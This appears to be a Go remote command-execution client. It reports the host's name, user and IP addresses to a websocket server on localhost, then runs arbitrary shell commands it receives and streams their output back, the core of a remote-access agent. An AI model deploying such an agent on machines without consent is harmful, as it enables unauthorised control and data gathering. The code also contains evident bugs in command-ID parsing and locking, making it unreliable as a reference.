package main

import (
	"bufio"
	"context"
	"crypto/rand"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"strings"
	"sync"
	"time"

	"github.com/coder/websocket"
)

var mut sync.Mutex

var id               int
var Commands         map[int]Execution
var CommandsStatuses map[int]int
var CommandsLogs     map[int]string
var commandsMsgs     map[int][]string
var PingError        error
var ReceiveError     error

type Execution struct {
	cmd    *exec.Cmd
	stdin  io.WriteCloser
	stdout io.ReadCloser
	stderr io.ReadCloser
}

type Message struct {
	Method   string `json:"Method"`
    Sender   int    `json:"sender"`
    Receiver int    `json:"receiver"`
    Message  []byte `json:"message"`
    End      bool   `json:"end"`
}

func NewMessageFromJSON(bytes []byte) (Message, error) {
    var msg Message
    err := json.Unmarshal(bytes, &msg)
    if err != nil { return Message{}, err }

    return msg, nil
}

func NewMessageToJSON(method string, sender, receiver int, message []byte, end bool) ([]byte, error) {
    msg := Message{
		Method:   method,
        Sender:   sender,
        Receiver: receiver,
        Message:  message,
        End:      end,
    }

    msg_bytes, err := json.Marshal(msg)
    if err != nil { return []byte{}, err }

    return msg_bytes, nil
}

type Client struct {
	Id           int
	SecretKey    string `json:"SecretKey"`
	ComputerName string `json:"ComputerName"`
	UserName     string `json:"UserName"`
	LocalIP      string `json:"LocalIP"`
	PublicIP     string `json:"PublicIP"`
	OS           string `json:"OS"`
	Conn         *websocket.Conn
}

func NewClient(secretKey, computerName, userName, localIP, publicIP, OS string) Client {
	if OS == "windows" {
		userName = strings.Split(userName, "\\")[1]
	}
	
	client := Client{
		SecretKey:    secretKey,
		ComputerName: computerName,
		UserName:     userName,
		LocalIP:      localIP,
		PublicIP:     publicIP,
		OS:           OS,
	}
	return client
}

func (client *Client) Start(websocket_URL string) {
	conn, _, err := websocket.Dial(context.Background(), websocket_URL, nil)
	if err != nil { log.Panic(err) }
	defer conn.CloseNow()

	client.Conn = conn

	bytes, err := json.Marshal(client)
	if err != nil { log.Panic(err) }

	err = client.Write("#!handshake", client.Id, -1, bytes, true)
	if err != nil { log.Panic(err) }

	msg, err := client.Read()
	if err != nil { log.Panic(err) }
	client.Id = msg.Receiver

	go client.Ping()
	client.Receive()
	if ReceiveError != nil {
		log.Panic(ReceiveError)
	}

	conn.Close(websocket.StatusNormalClosure, "")
}

func (client *Client) Ping() {
	var err error
	for {
		err = client.Conn.Ping(context.Background())
		if err != nil {
			PingError = err
			return
		}
		
		time.Sleep(300 * time.Millisecond)
	}
}

func Execute(command, os string) (Execution, error) {
	var cmd *exec.Cmd
	if os == "windows" {
		cmd = exec.Command("cmd", "/c", command)
	} else {
		cmd = exec.Command("bash", "-c", command)
	}

	stdin,  err := cmd.StdinPipe()
	if err != nil { return Execution{cmd, nil, nil, nil}, err }

	stdout, err := cmd.StdoutPipe()
	if err != nil { return Execution{cmd, nil, nil, nil}, err }

	stderr, err := cmd.StderrPipe()
	if err != nil { return Execution{cmd, nil, nil, nil}, err }

	if err := cmd.Start(); err != nil { return Execution{cmd, nil, nil, nil}, err }
	return Execution{cmd, stdin, stdout, stderr}, nil
}

func (client *Client) Receive() {
	for {
		if PingError != nil { return }

		msg, err := client.Read()
		if PingError != nil { return }
		if err != nil { log.Panic(err) }

		msgparts := strings.Split(string(msg.Message), " ")
		if msg.Method == "#!execute" {
			ExecutionFunction(client, msg)
		} else if msg.Method == "#!execution" && msgparts[0] == "list" {
			bytes, err := json.Marshal(CommandsStatuses)
			if err != nil { log.Panic(err) }

			client.Write("#!execution", client.Id, msg.Sender, bytes, true)
		} else if msg.Method == "#!execution" && msgparts[0] == "id" && msgparts[2] == "ok" {
			var cmdid int
			if n, _ := fmt.Sscan(msgparts[1], &cmdid); n == 0 { log.Panic(err) }

			mut.Lock()
			commandsMsgs[cmdid] = append(commandsMsgs[cmdid], msgparts[2])
			mut.Unlock()
		} else if msg.Method == "#!execution" && msgparts[0] == "id" && msgparts[2] == "stop" {
			var cmdid int
			if n, _ := fmt.Scan(msgparts[2], &cmdid); n == 0 { log.Panic(err) }

			mut.Lock()
			execution := Commands[cmdid]
			execution.cmd.Cancel()
			mut.Unlock()

			err := client.Write("#!execution", client.Id, msg.Sender, []byte(fmt.Sprintf("id %d interrupted", cmdid)), true)
			if err != nil { log.Panic(err) }
		} else if msg.Method == "#!execution" && msgparts[0] == "id" && msgparts[2] == "log" {
			var cmdid int
			if n, _ := fmt.Scan(msgparts[2], &cmdid); n == 0 { log.Panic(err) }

			mut.Lock()
			commandLog := CommandsLogs[cmdid]
			mut.Unlock()

			err := client.Write("#!execution", client.Id, msg.Sender, []byte(fmt.Sprintf("id %d log %v", cmdid, commandLog)), true)
			if err != nil { log.Panic(err) }
		} else if msg.Method == "#!execution" && msgparts[0] == "id" && msgparts[2] == "delete" {
			var cmdid int
			if n, _ := fmt.Scan(msgparts[2], &cmdid); n == 0 { log.Panic(err) }

			mut.Lock()
			commandStatus := CommandsStatuses[cmdid]
			mut.Unlock()

			if commandStatus == 0 {
				mut.Lock()
				execution := Commands[cmdid]
				execution.cmd.Cancel()
				mut.Unlock()
			}

			err := client.Write("#!execution", client.Id, msg.Sender, []byte(fmt.Sprintf("id %d deleted", cmdid)), true)
			if err != nil { log.Panic(err) }
		} else {
			fmt.Println(msg.Method, string(msg.Message), msg.End)
		}
	}
}

func ExecutionFunction(client *Client, msg Message) {
	cmdid := id; id++
	cmdparts := strings.Split(string(msg.Message), " ")
	err := client.Write("#!execution", client.Id, msg.Sender, []byte(fmt.Sprint("id ", cmdid, " start ", cmdparts[1])), true)
	if err != nil { log.Panic(err)}

	execution, err := Execute(strings.Join(cmdparts[2:], " "), client.OS)
	if err != nil { client.Write("#!execution", client.Id, msg.Sender, []byte(err.Error()), true) }

	go func(){
		mut.Lock()
		commandsMsgs[cmdid]     = []string{}
		CommandsLogs[cmdid]     = ""
		CommandsStatuses[cmdid] = 0
		mut.Unlock()

		scanner := bufio.NewScanner(execution.stdout)
		var c int
		for scanner.Scan() {
			fmt.Println(c)
			c++
			bytes := scanner.Bytes()
			err := client.Write("#!execution", client.Id, msg.Sender, append([]byte(fmt.Sprintf("id %d ", cmdid)), bytes...), false)
			file, _ := os.OpenFile("out", os.O_CREATE|os.O_APPEND, 0777)
			file.Write(bytes)
			file.Close()
			if err != nil { log.Panic(err)}
			
			msg := ""
			for {
				mut.Lock()
				msgs := commandsMsgs[cmdid]
				if len(msgs) > 0 { msg = msgs[0]; commandsMsgs[cmdid] = commandsMsgs[cmdid][1:]; break }
				mut.Unlock()
			}

			if msg != "ok" {
				log.Panic(msg)
			}
		}

		defer execution.cmd.Wait()
	}()
}

func (client *Client) Read() (Message, error) {
	_, bytes, err := client.Conn.Read(context.Background())
    if err != nil { log.Panic(err, 3); return Message{}, err }
    
    msg, err := NewMessageFromJSON(bytes)
    if err != nil { log.Panic(err, 14); return Message{}, err }

	fmt.Println("Read: ", msg.Method, string(msg.Message), msg.End)
    return msg, nil
}

func(client *Client) Write(method string, sender, receiver int, bytes []byte, end bool) error {
	fmt.Println("Write: ", method, string(bytes), end)
	msg_bytes, err := NewMessageToJSON(method, sender, receiver, bytes, end)
    if err != nil { log.Panic(err, 4); return err }

    err = client.Conn.Write(context.Background(), websocket.MessageText, msg_bytes)
    if err != nil { log.Panic(err, 10); return err }

	return nil
}

func getSecretKey(n int) (string, error) {
	hasher := sha256.New()
	b := make([]byte, n)
	_, err := rand.Read(b)
	if err != nil {
		return "", err
	}

	hasher.Write(b)
	sha := hex.EncodeToString(hasher.Sum(nil))

	return sha, nil
}

func getUserName() (string, error) {
	user, err := user.Current()
	if err != nil { return "", err }
	return user.Username, nil
}

func getComputerName() (string, error) {
	computerName, err := os.Hostname()
	if err != nil { return "", err }
	return computerName, nil
}

func getLocalIP() (string, error) {
	interfaces, err := net.Interfaces()
	if err != nil { return "", err }

	for _, iface := range interfaces {
		addrs, err := iface.Addrs()
		if err != nil { return "", err }

		for _, addr := range addrs {
			var ip net.IP
			switch v := addr.(type) {
			case *net.IPNet:
				ip = v.IP
			case *net.IPAddr:
				ip = v.IP
			}

			if ipv4 := ip.To4(); ipv4 != nil && !ip.IsLoopback() { return ipv4.String(), nil }
		}
	}

	return "", fmt.Errorf("локальный IP адрес не найден")
}

func getPublicIP() (string, error) {
	resp, err := http.Get("https://api.ipify.org")
	if err != nil { return "", err }
	defer resp.Body.Close()

	ip, err := io.ReadAll(resp.Body)
	if err != nil { return "", err }

	return string(ip), nil
}

func main() {
	CommandsStatuses = map[int]int{}
    CommandsLogs     = map[int]string{}
    commandsMsgs     = map[int][]string{}

	secretKey, err := getSecretKey(256)
	if err != nil { log.Fatal(err) }

	computerName, err := getComputerName()
	if err != nil { log.Fatal(err) }

	userName, err := getUserName()
	if err != nil { log.Print("Warning: ", err) }

	publicIP, err := getPublicIP()
	if err != nil { log.Fatal(err) }

	localIP, err := getLocalIP()
	if err != nil { log.Fatal(err) }

	client := NewClient(secretKey, computerName, userName, localIP, publicIP, runtime.GOOS)
	client.Start("ws://127.0.0.1:8080/ws/")
}
